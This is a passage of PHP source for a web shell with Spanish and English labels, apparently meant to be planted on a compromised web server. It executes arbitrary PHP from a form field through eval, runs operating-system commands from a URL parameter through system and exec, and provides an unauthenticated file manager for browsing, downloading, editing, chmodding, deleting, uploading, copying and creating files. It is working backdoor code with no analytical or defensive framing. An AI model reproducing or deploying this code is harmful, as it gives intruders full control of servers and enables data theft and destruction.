echo '</textarea><br/><input type=submit name=cargar value=Send style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></form>';
if (isset($_POST['cargar'])) {
echo "<br/><br/>";
eval($_POST['codigo']);
echo "<br/><br/><br/>
";
}} else {
      $homedir=getcwd();
      $dir=realpath($_GET['dir'])."/";
echo '<div style="text-align: center;"><big><big style="color: white;">File manager</big></big><div style="text-align: left;"><br/> &nbsp;&nbsp;<b>Shell:</b> '.$shelldir.'<br/>&nbsp;&nbsp;<b>Home:</b>'.$homedir.'/<br/>&nbsp;&nbsp;<b>Now dir:</b>'.$dir.'<br/>';
$dir = opendir($path);
echo "<b>&nbsp;&nbsp;Drives found: </b>"; foreach($scan as $drives) {
$drives = $drives.":\\";
if (is_dir($drives)) {
echo "&nbsp;&nbsp;"."<a href=?dir=".$drives.">".$drives."</a><br/><br/>";
    }
  else  {
  $drives = "";
  }}
if ($drives == "") {
  echo 'None.'; } 
    
  echo '<br/><br/>';
$homedir=getcwd();
      $dir=realpath($_GET['dir'])."/";
?>
<div align="center">
  <table border="0" width="100%" id="table1" style="border: 0px dotted #FFCC99" cellspacing="0" cellpadding="0" height="100">
    <tr>
      <td style="border: 0px dotted #FFCC66" valign="top" rowspan="2">
        <p align="center"><b>
        <font face="Tahoma" size="2"><br>
        </font>
        <font color="#D2D200" face="Tahoma" size="2">
        <span style="text-decoration: none">
        <font color="#000000">
        <a href="?dir="<?
  echo getcwd();    
      echo '"><td style="border: 0px dotted #FFCC66" align="center"><form action="" method="GET">&nbsp;Go to: </b><input type="text" name="dir" size="80"  style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"  value='.$dir.'><input type="submit"  style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"  value="Send"></form><br>';
      echo "<div align='center'><table border='0'  style='color: #848484; font-weight: bold; border: 1px dashed #333333; background-color: #000000' id='table1' style='border: 1px #333333' height='90' cellspacing='0' cellpadding='0'><tr><td width='330' height='30' align='left'><b><font size='2'>Nombre:</font></b></td><td height='28' width='132' align='left'><font color='#A9D0F5' size='2'><b>Size:</b></font></td><td height='28' width='133' align='left'><font color='#008000' size='2'><b>Download:</b></font></td><td height='28' width='126' align='left'><font color='#FF9933' size='2'><b>Edit:</b></font></td>  <td height='28' width='135' align='left'><font color='#999999' size='2'><b>Perms:</b></font></td><td height='28' width='135' align='left'><font color='#999999' size='2'><b>Chmod:</b></font></td><td height='28' width='135' align='left'><font color='#FF0000' size='2'><b>Delete:</b></font></td></tr>";
        if (is_dir($dir)){
        if ($dh=opendir($dir)){
        while (($file = readdir($dh)) !== false) {
        $fsize=round(filesize($dir . $file)/1024);
  echo " <tr><th width='250' height='42' align='left' nowrap>";
    if (is_dir($dir.$file))
    {
    echo "<a href='?dir=$dir$file'><span style='text-decoration: none'><font size='2' color='#848484'>&nbsp;$file";
    }
    else {
    echo "<a target='_blank' href='?editar=$dir$file'><span style='text-decoration: none'><font size='2' color='#E0E6F8'>&nbsp;$file";
    }
    echo "</a></font></th><td width='113' align='left' nowrap><font color='#A9D0F5' size='2'><b>";
    if (is_file($dir.$file))
    {
    echo $fsize.' KB';
    }
    else {
    if (is_dir($dir.$file))
    {
    echo "&nbsp; <font color='#E0F2F7' size='2'>DIR</font>";
    }
    }
    echo "</b></font></td><td width='103' align='left' nowrap>";
    if (is_file($dir.$file)){
    if (is_readable($dir.$file)){
    echo "<a href='?descargar=$dir$file'><span style='text-decoration: none'><font size='2' color='#008000'>Descargar";
    }else {
    echo "<font size='1' color='#FF0000'><b>Can not read</b>";
     }
    }else {
    echo "&nbsp; -";
     }
    echo "</a></font></td><td width='77' align='left' nowrap>";
    if (is_file($dir.$file))
    {
    if (is_readable($dir.$file)){
    echo "<a target='_blank' href='?editar=$dir$file'><span style='text-decoration: none'><font color='#FF9933' size='2'>Editar";
    }else {
    echo "<font size='1' color='#FF0000'><b>Can not read</b>";
     }
    }else {
    echo "&nbsp; -";
     }
    echo "</a></font></td><td width='86' align='left' nowrap>";
echo permisos($file)."</a></font></td><td width='86'align='left' nowrap>";
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    echo "<font size='1' color='#999999'>Not valid on windows";
    }
    else {
    echo "<a href='?fchmod=$dir$file'><span style='text-decoration: none'><font size='2' color='#999999'>Chmod";
    }
    echo "</a></font></td><td width='86'align='left' nowrap>";
    if (is_file($dir.$file)){
    echo "<a href='?borrar=$dir$file'><span style='text-decoration: none'><font size='2' color='#FF0000'>Borrar</a></font></td>";
} else {
    echo "&nbsp; -";    } 
  echo "</tr>";  }
          closedir($dh);        } 
    }echo '</table></div></td></tr></table></div><br/><br/>';
if($_GET['cmd']) {
echo '<hr style="width: 100%; height: 2px;">';
$modo = $_GET[modo];
if ($modo=='System') {
  system($_GET['cmd']);
  } elseif ($modo=='Exec') {
  echo exec($_GET['cmd']);
  }}echo '<hr style="width: 100%; height: 2px;"><FORM METHOD="GET" NAME="consola" ACTION=""><span style="font-weight: bold;">Cmd: </span><INPUT TYPE="text" NAME="cmd" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"><select name="modo" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"><option selected>System</option><option>Exec</option></select> <INPUT TYPE="submit" VALUE="Send" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></FORM><pre><hr style="width: 100%; height: 2px;"></div><body><div style="text-align: left;"><form method="POST" action=""><span style="font-weight: bold;">Create dir: </span><input type="text" name="nombre_dir" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"><input type="submit" name="botonsito" VALUE="Send" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></p>';
if ($_POST['nombre_dir'] != "") {
if (isset($_POST['botonsito'])) {
$nombre_dir = $_POST['nombre_dir'];
mkdir($nombre_dir);
echo "<script language='javascript'> history.back(1)</script>";
echo 'Directorio creado correctamente';
} else {
echo 'Error to create file.'; 
}}echo '</form><pre><hr style="width: 100%; height: 2px;"></div><div style="text-align: left;"><form action="" method=POST><b>Create file:</b> <input type=text style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" name=creara><input style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"  type=submit value=Send>';
if (isset($_POST['creara'])) {
chdir($_POST['dir']);
if (fopen($_POST['creara'],"w")) {
echo "File created.";
echo "<script language='javascript'> history.back(1)</script>";
}else {
echo "Error to created file.";
}}echo '</form><pre><hr style="width: 100%; height: 2px;"></div><div style="text-align: left;"><form enctype="multipart/form-data" action="" method=POST><b>Upload: </b><input type=file name=archivo style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"> to: <input type=text name=destino style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" value='.$dir.'><input type=submit value=Send style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"><br></form>';
if (isset($_FILES['archivo'])) {
$subir = basename($_FILES['archivo']['name']);
if (move_uploaded_file($_FILES['archivo']['tmp_name'],$subir)) {
}}echo '<pre><hr style="width: 100%; height: 2px;"></div><div style="text-align: left;"><form action="" method=POST><b>Copy: </b><input type=text name=archivo style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" value='.$dir.'archivo1.php> to: <input type=text name=nuevo  style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" value='.$dir.'archivo2.php><input type=submit style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" value=Send>';
if ($_POST['archivo'] != '') {
if (copy($_POST['archivo'],$_POST['nuevo'])) {
echo "  Copiado correctamente."; 
echo "<script language='javascript'> history.back(1)</script>";
} else {
echo 'Copy error.';
} }echo '</form>';
}echo '
</span></td>    </tr>  </tbody></table><br style="color: rgb(153, 153, 153);"><hr style="width: 100%; height: 2px; color: rgb(153, 153, 153);"><span style="color: rgb(153, 153, 153);">'.$nombre_s.' '.$version.'</span><br></div></body></html>';
?>
